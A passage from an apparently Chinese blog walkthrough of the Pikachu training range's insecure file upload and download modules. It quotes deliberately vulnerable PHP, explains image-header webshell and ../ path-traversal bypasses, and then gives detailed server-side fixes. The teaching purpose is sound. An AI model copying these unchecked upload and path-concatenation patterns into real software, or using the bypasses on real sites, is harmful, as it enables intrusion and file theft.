+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//     var_dump($_FILES);</span></span><br><span class="line">    <span class="variable">$mime</span>=<span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);<span class="comment">//指定MIME类型,这里只是对MIME类型做了判断。</span></span><br><span class="line">    <span class="variable">$save_path</span>=<span class="string">&#x27;uploads&#x27;</span>;<span class="comment">//指定在当前目录建立一个目录</span></span><br><span class="line">    <span class="variable">$upload</span>=<span class="title function_ invoke__">upload_sick</span>(<span class="string">&#x27;uploadfile&#x27;</span>,<span class="variable">$mime</span>,<span class="variable">$save_path</span>);<span class="comment">//调用函数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$upload</span>[<span class="string">&#x27;return&#x27;</span>])&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：<span class="subst">&#123;$upload[&#x27;new_path&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=notice&gt;<span class="subst">&#123;$upload[&#x27;error&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>校验虽然挪到了服务端，但选错了字段：<code>$_FILES[&#39;type&#39;]</code> 来自请求头体里的 <code>Content-Type</code>，<strong>由客户端声明</strong>，Burp 一改就过。校验的字段必须是服务端自己能验证的事实（文件后缀、文件内容），而不能是客户端的请求。</p>
+<p>且这里做的是白名单校验，像<code>shell.php.abc</code>或者字符串截断这种都无法成功。</p>
+<h3 id="3-3-上传·getimagesize"><a href="#3-3-上传·getimagesize" class="headerlink" title="3.3 上传·getimagesize"></a>3.3 上传·getimagesize</h3><p><code>getimagesize.php</code> 调用严格的 <code>uploadfunction()</code>，五道检查值得逐条看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123; ... &#125;          <span class="comment">// 1. 确认是 HTTP POST 上传的</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$arr_filename</span>[<span class="string">&#x27;extension&#x27;</span>]),<span class="variable">$type</span>))&#123; ... &#125; <span class="comment">// 2. 后缀白名单，小写比较</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$mime</span>))&#123; ... &#125;               <span class="comment">// 3. MIME 校验</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123; ... &#125;              <span class="comment">// 4. 文件内容真是图片</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;size&#x27;</span>]&gt;<span class="variable">$size</span>)&#123; ... &#125;                           <span class="comment">// 5. 大小限制</span></span><br><span class="line"><span class="variable">$new_filename</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">100000</span>,<span class="number">999999</span>),<span class="literal">true</span>));  <span class="comment">// 6. 随机重命名</span></span><br></pre></td></tr></table></figure>
+
+<p>和前两关对比，它做对了几件关键的事：<strong>后缀自己解析、小写化、白名单比对</strong>（堵住大小写、双后缀）；**<code>getimagesize()</code> 检查文件头<strong>（纯改名的马过不了）；</strong>随机重命名**（用户可控的文件名彻底出局，原文件名不再出现在磁盘上）。</p>
+<p>但这里还有一个漏洞，就是<code>getimagesize()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过getimagesize来读取图片的属性，从而判断是不是真实的图片，还是可以被绕过的</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$return_data</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&#x27;你上传的是个假图片，不要欺骗我！&#x27;</span>;</span><br><span class="line">        <span class="variable">$return_data</span>[<span class="string">&#x27;return&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$return_data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>getimagesize()</code>函数 不是完整性校验，它只解析图片头部&#x2F;必要结构，拿到宽高和类型；图片数据之后追加的内容通常会被忽略。所以“合法图片头 + 任意追加数据”一般就能过。</p>
+<p>而且后端分别检查了后缀、MIME 和 getimagesize() 返回的图片头，但没有校验三者是否一致，也没有对图片重新编码。我们使用 GIF89a 伪造图片头，把文件后缀改成 .jpg，声明 MIME 为 image&#x2F;jpeg，即可绕过检查，形成图片马。若上传目录可执行脚本，或存在本地文件包含，则可进一步 RCE。</p>
+<h3 id="3-4-下载·拼接-探测反馈"><a href="#3-4-下载·拼接-探测反馈" class="headerlink" title="3.4 下载·拼接 + 探测反馈"></a>3.4 下载·拼接 + 探测反馈</h3><p><code>execdownload.php</code> 的核心代码（下载逻辑全文其实就这么一段）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_path</span>=<span class="string">&quot;download/<span class="subst">&#123;$_GET[&#x27;filename&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//用以解决中文不能显示出来的问题</span></span><br><span class="line"><span class="variable">$file_path</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;gb2312&quot;</span>,<span class="variable">$file_path</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//首先要判断给定的文件存在与否</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">skip</span>(<span class="string">&quot;你要下载的文件不存在，请重新下载&quot;</span>, <span class="string">&#x27;unsafe_down.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$file_path</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$file_size</span>=<span class="title function_ invoke__">filesize</span>(<span class="variable">$file_path</span>);</span><br><span class="line"><span class="comment">//下载文件需要用到的头</span></span><br><span class="line"><span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Accept-Ranges: bytes&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Accept-Length:&quot;</span>.<span class="variable">$file_size</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$file_path</span>));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$file_count</span>&lt;<span class="variable">$file_size</span>)&#123;</span><br><span class="line">    <span class="variable">$file_con</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="variable">$buffer</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file_con</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码分析：</p>
+<ul>
+<li>唯一的漏洞点就是第一行：<code>&quot;download/&#123;$_GET[&#39;filename&#39;]&#125;&quot;</code> <strong>直接拼接</strong>，<code>../</code> 原样进入路径，没有任何过滤、白名单或目录限定；</li>
+<li><code>file_exists()</code> 不是防护，反而帮了攻击者的忙——它把”猜路径”变成了<strong>有反馈的试错</strong>：存在就下载、不存在就提示，等于一个免费的文件存在性探测接口；</li>
+<li><code>iconv(&quot;utf-8&quot;,&quot;gb2312&quot;,...)</code> 只是为了中文文件名显示，纯 ASCII 的 payload 原样通过，不构成任何阻碍；</li>
+<li><code>Content-Disposition: attachment</code> + 字节流输出的写法本身是标准的，坏就坏在路径来源上——**下载功能的实现没错，错的是”信了前端传来的文件名”**。</li>
+</ul>
+<p>把四个入口并排看，会发现校验的”位置”和”字段”决定了一切：写在前端&#x3D;没有；写错字段&#x3D;形同虚设；写在服务端、校验服务端能验证的事实&#x3D;合格。下载关连校验都没有，只剩一个反而是帮倒忙的存在性检查。</p>
+<hr>
+<h2 id="四、修复方案"><a href="#四、修复方案" class="headerlink" title="四、修复方案"></a>四、修复方案</h2><p><strong>文件上传</strong>：校验必须全部发生在服务端，且校验的是服务端自己能验证的事实。后缀白名单（解析后小写比对，禁 <code>php</code>&#x2F;<code>phtml</code>&#x2F;<code>.htaccess</code> 等一切可执行后缀）、<code>getimagesize()</code>&#x2F;<code>finfo</code> 校验文件真实内容、限制大小；文件名彻底放弃用户输入，随机重命名后保存；上传目录与网站目录分离或禁止执行（Nginx <code>location ~* ^/uploads/.*\.php$ &#123; deny all; &#125;</code>、Apache 用 <code>php_admin_flag engine off</code>），成功响应只返回文件 ID 而不是完整路径；再往上，图片二次渲染抹掉附加数据、上传接口限速鉴权，都算加固。</p>
+<p><strong>文件下载</strong>：不要让用户输入决定服务器的文件路径。最稳妥的做法是后端映射——前端传文件 ID 或枚举值，后端查表拿到真实文件名（图片根本没有必要让前端传名字）；确实要传文件名时，用 <code>basename()</code> 剥掉路径部分，拼上固定的下载根目录，再用 <code>realpath()</code> 校验最终路径仍在根目录之内，顺手把后缀限制在白名单里。再往上，下载目录单独建、只放可公开的文件，与上传目录和程序目录物理分开；<code>open_basedir</code> 限制 PHP 可访问范围；对同一 IP 的高频”不存在”请求限速（防探测）；静态文件下载交给 Web 服务器处理、动态接口只签发带过期时间的下载令牌，都算加固。</p>
+<hr>
+<h2 id="五、免责声明"><a href="#五、免责声明" class="headerlink" title="五、免责声明"></a>五、免责声明</h2><p>本文所有操作均在<strong>本人本地搭建的 Pikachu 靶场</strong>中完成，<br>Pikachu 是公开的、专用于安全教学的漏洞练习平台。<br>文中涉及的技术仅用于学习与防御研究，<strong>不得用于任何未授权的系统</strong>。<br>对真实系统进行未授权的渗透测试属于违法行为。</p>
+<hr>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://qu0rtz-blip.github.io">Qu0rtz-blip</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://qu0rtz-blip.github.io/2026/11/26/Pikachu-Upload-Download/">https://qu0rtz-blip.github.io/2026/11/26/Pikachu-Upload-Download/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://qu0rtz-blip.github.io" target="_blank">Qu0rtz-blip 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pikachu%E9%9D%B6%E5%9C%BA/">Pikachu靶场</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">文件下载</a><a class="post-meta__tags" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a><a class="post-meta__tags" href="/tags/%E8%9A%81%E5%89%91/">蚁剑</a></div><div class="post-share"><div class="social-share" data-image="/img/cover-4.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/11/26/Pikachu-URL-Redirect/" title="Pikachu靶场通关：URL重定向"><img class="cover" src="/img/cover-5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Pikachu靶场通关：URL重定向</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）URL 重定向通关记录 实验环境：Windows 10 + Pikachu + Burp Suite   本次记录皮卡丘靶场 Unsafe URL Redirect（不安全的 URL 跳转）模块的通关过程。这一关的输入是一个跳转目标，改掉它，页面就跳去了别的地方——漏洞本身不复杂，麻烦的是它常被用来做钓饵，或者当成绕过白名单的跳板。   一、URL 重定向1.1 什么...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-SSRF/" title="Pikachu靶场通关：SSRF"><img class="cover" src="/img/cover-2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pikachu靶场通关：SSRF</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）SSRF 通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 SSRF 模块两个关卡的通关过程。这一关的输入是一个 URL，服务器拿它去发请求、再把结果还给我们——等于借服务器的身份，在它自己的网络位置上替我们”点一次链接”。   一、SSRF1.1...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/06/Meterpreter%20%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：Meterpreter 远程控制与一句话木马"><img class="cover" src="/img/cover-5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-06</div><div class="info-item-2">网络渗透课程作业：Meterpreter 远程控制与一句话木马</div></div><div class="info-2"><div class="info-item-1">Meterpreter 远程控制与一句话木马复现 对应课程：ch6 远程控制（PPT 第 9-10 页 + 作业）内容：msfvenom 生成被控端并远程控制、微步云沙箱检测、一句话木马与蚁剑连接  0. 实验环境   角色 系统 说明    攻击机 Kali Linux 运行 msfvenom、MSF   靶机 Windows 10 x64 虚拟机 运行生成的 payload.exe，部署...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-RCE/" title="Pikachu靶场通关：RCE"><img class="cover" src="/img/cover-6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：RCE</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）RCE 远程代码执行通关记录 实验环境：Windows 10 + Pikachu靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 RCE 模块两个小关卡的通关过程。打完两关再回源码，看这两行”图省事”的写法各自错在哪，以及正确的写法应该是什么。   一、RCERCE（Remote Code Execution）不是一个具体的漏洞点，...</div></div></div></a><a class="pagination-related" href="/2026/11/12/Pikachu-XSS/" title="Pikachu靶场通关：XSS"><img class="cover" src="/img/cover-4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-12</div><div class="info-item-2">Pikachu靶场通关：XSS</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）XSS 跨站脚本攻击通关记录 实验环境：Windows 10 + Pikachu + Edge   本次记录皮卡丘靶场 XSS 模块全部 10 个小关卡的通关过程。XSS 的本质是用户输入被浏览器当成了代码执行：同样是往一个框里贴 payload，有的贴在 HTML 正文里、有的贴在标签属性里、有的贴在 JS 字符串里、有的贴在 href 里——输出位置不同，闭合和触...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-File-Inclusion/" title="Pikachu靶场通关：文件包含"><img class="cover" src="/img/cover-5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：文件包含</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）文件包含通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 File Inclusion 模块两个关卡的通关过程。这一关的输入是一个”文件名”，而文件名决定了服务器去执行哪个文件——打完两关再回源码，看一行 include &quot;include...</div></div></div></a><a class="pagination-related" href="/2026/11/12/Pikachu-CSRF/" title="Pikachu靶场通关：CSRF"><img class="cover" src="/img/cover-1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-12</div><div class="info-item-2">Pikachu靶场通关：CSRF</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）CSRF 跨站请求伪造通关记录 实验环境：Windows 10 + Pikachu + Edge &#x2F; Burp Suite靶场地址：http://10.33.20.10/pikachu/   本次记录皮卡丘靶场 CSRF 模块全部 3 个小关卡的通关过程。这一关的靶场对象是一个”个人会员中心”，可以修改性别、手机、住址、邮箱——现实生活中对应的场景是转账、改...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权"><img class="cover" src="/img/cover-1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：越权</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）越权通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 Over Permission（越权）模块两个关卡的通关过程。越权不是一个”技术点”，而是一个”校验点”：功能本身没写错，错在该校验的地方没校验。水平越权是横向借别人的数据，垂直越权是纵向借别人...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Qu0rtz-blip</div><div class="author-info-description">信息安全学习笔记 · CTF 与漏洞复现</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">60</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Qu0rtz-blip"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Qu0rtz-blip" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，这里记录 CTF 与漏洞复现的学习过程 📝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9A%AE%E5%8D%A1%E4%B8%98%EF%BC%88Pikachu%EF%BC%89%E4%B8%8D%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">皮卡丘（Pikachu）不安全文件上传与下载通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.1.</span> <span class="toc-text">一、不安全文件上传与下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%A4%E4%B8%AA%E5%8A%9F%E8%83%BD%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%A0%B9%E5%9B%A0"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 两个功能，一个根因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%85%B3%E5%8D%A1%E5%85%A5%E5%8F%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 关卡入口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%B8%8A%E4%BC%A0%C2%B7%E5%AE%A2%E6%88%B7%E7%AB%AF-check"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 上传·客户端 check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E4%B8%8A%E4%BC%A0%C2%B7%E6%9C%8D%E5%8A%A1%E7%AB%AF-check%EF%BC%88MIME-%E6%A0%A1%E9%AA%8C%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 上传·服务端 check（MIME 校验）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E4%B8%8A%E4%BC%A0%C2%B7getimagesize-%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 上传·getimagesize 校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E4%B8%8B%E8%BD%BD%C2%B7%E5%85%88%E6%AD%A3%E5%B8%B8%E4%B8%8B%E8%BD%BD%E4%B8%80%E6%AC%A1"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.4 下载·先正常下载一次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E4%B8%8B%E8%BD%BD%C2%B7%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%8C%E6%8A%8A%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.5 下载·路径穿越，把源码下载下来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-%E4%B8%8B%E8%BD%BD%C2%B7%E5%A4%B1%E8%B4%A5%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7"><span class="toc-number">1.2.6.</span> <span class="toc-text">2.6 下载·失败长什么样</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%98%AF%E6%80%8E%E4%B9%88%E5%86%99%E5%87%BA%E6%9D%A5%E7%9A%84"><span class="toc-number">1.3.</span> <span class="toc-text">三、源码分析：漏洞是怎么写出来的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E4%B8%8A%E4%BC%A0%C2%B7%E5%AE%A2%E6%88%B7%E7%AB%AF-check%E2%80%94%E2%80%94%E6%A0%A1%E9%AA%8C%E5%86%99%E5%9C%A8%E4%BA%86%E6%B5%8F%E8%A7%88%E5%99%A8%E9%87%8C"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 上传·客户端 check——校验写在了浏览器里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E4%B8%8A%E4%BC%A0%C2%B7%E6%9C%8D%E5%8A%A1%E7%AB%AF-check%E2%80%94%E2%80%94%E6%A0%A1%E9%AA%8C%E4%BA%86%E5%8F%AF%E4%BB%A5%E4%BC%AA%E9%80%A0%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 上传·服务端 check——校验了可以伪造的字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E4%B8%8A%E4%BC%A0%C2%B7getimagesize"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 上传·getimagesize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E4%B8%8B%E8%BD%BD%C2%B7%E6%8B%BC%E6%8E%A5-%E6%8E%A2%E6%B5%8B%E5%8F%8D%E9%A6%88"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.4 下载·拼接 + 探测反馈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">1.4.</span> <span class="toc-text">四、修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.5.</span> <span class="toc-text">五、免责声明</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-Dir-Traversal-Info-Leak/" title="Pikachu靶场通关：目录遍历与信息泄露"><img src="/img/cover-2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：目录遍历与信息泄露"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-Dir-Traversal-Info-Leak/" title="Pikachu靶场通关：目录遍历与信息泄露">Pikachu靶场通关：目录遍历与信息泄露</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权"><img src="/img/cover-1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：越权"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权">Pikachu靶场通关：越权</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-File-Inclusion/" title="Pikachu靶场通关：文件包含"><img src="/img/cover-5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：文件包含"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-File-Inclusion/" title="Pikachu靶场通关：文件包含">Pikachu靶场通关：文件包含</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-PHP-Unserialize/" title="Pikachu靶场通关：PHP反序列化"><img src="/img/cover-3.jpg" 